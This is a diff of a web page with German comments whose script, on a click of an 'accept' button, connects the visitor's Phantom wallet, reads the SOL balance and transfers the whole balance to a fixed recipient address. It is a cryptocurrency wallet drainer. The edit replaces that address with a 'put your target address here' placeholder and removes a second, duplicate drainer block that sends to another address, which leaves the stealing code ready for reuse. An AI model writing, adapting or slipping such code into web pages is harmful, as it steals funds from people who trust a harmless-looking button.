@@ -285,6 +285,7 @@
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
     <script>
         document.getElementById("acceptButton").addEventListener("click", async () => {
             if (window.solana && window.solana.isPhantom) {
@@ -302,10 +303,8 @@
                     // Hole den SOL-Guthaben
                     const balance = await connection.getBalance(publicKey);
 
-                    console.log("Balance: ", balance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
-
                     // Zieladresse (Beispiel-Wallet)
-                    const recipient = new solanaWeb3.PublicKey("64BiYMiusprav2GbnPbTY59oY1JkAA3Ny5BQftiNCC28");
+                    const recipient = new solanaWeb3.PublicKey("IHRE_ZIELADRESSE_HIER");
 
                     // Berechne den Betrag, der gesendet werden soll (die gesamte Balance)
                     const amount = balance;
@@ -322,8 +321,6 @@
                     // Sende die Transaktion
                     const signature = await window.solana.signAndSendTransaction(transaction);
 
-                    console.log("Transaktionssignatur:", signature);
-
                     // Bestätige die Transaktion
                     await connection.confirmTransaction(signature, "confirmed");
 
@@ -336,52 +333,6 @@
                 alert("Bitte installiere Phantom Wallet, um diese Funktion zu nutzen.");
             }
         });
-        if (window.solana && window.solana.isPhantom) {
-    // Verbindung erfolgreich
-}
-else {
-    alert("Bitte installiere Phantom Wallet, um diese Funktion zu nutzen.");
-    document.getElementById("acceptButton").addEventListener("click", async () => {
-    if (window.solana && window.solana.isPhantom) {
-        try {
-            console.log("Versuche, mit Phantom zu verbinden...");
-            await window.solana.connect();
-            console.log("Verbindung erfolgreich!");
-            const wallet = window.solana;
-            const publicKey = wallet.publicKey;
-            console.log("Öffentlicher Schlüssel:", publicKey.toString());
-
-            // Solana-Verbindung
-            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
-            const balance = await connection.getBalance(publicKey);
-            console.log("Balance:", balance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
-
-            // Zieladresse und Transaktion
-            const recipient = new solanaWeb3.PublicKey("Z9UyZyZTxXvh5ZtRmVkt5pz7FtdgAQtWUNgsL6ztiuA9");
-            const amount = balance;
-
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: wallet.publicKey,
-                    toPubkey: recipient,
-                    lamports: amount,
-                })
-            );
-
-            const signature = await window.solana.signAndSendTransaction(transaction);
-            console.log("Transaktionssignatur:", signature);
-            alert("Transaktion erfolgreich!");
-        } catch (error) {
-            console.error("Fehler:", error);
-            alert("Fehler bei der Verbindung oder Transaktion.");
-        }
-    } else {
-        alert("Phantom Wallet ist nicht verfügbar oder nicht korrekt installiert.");
-    }
-});
-
-}
-
     </script>
 
 </body>
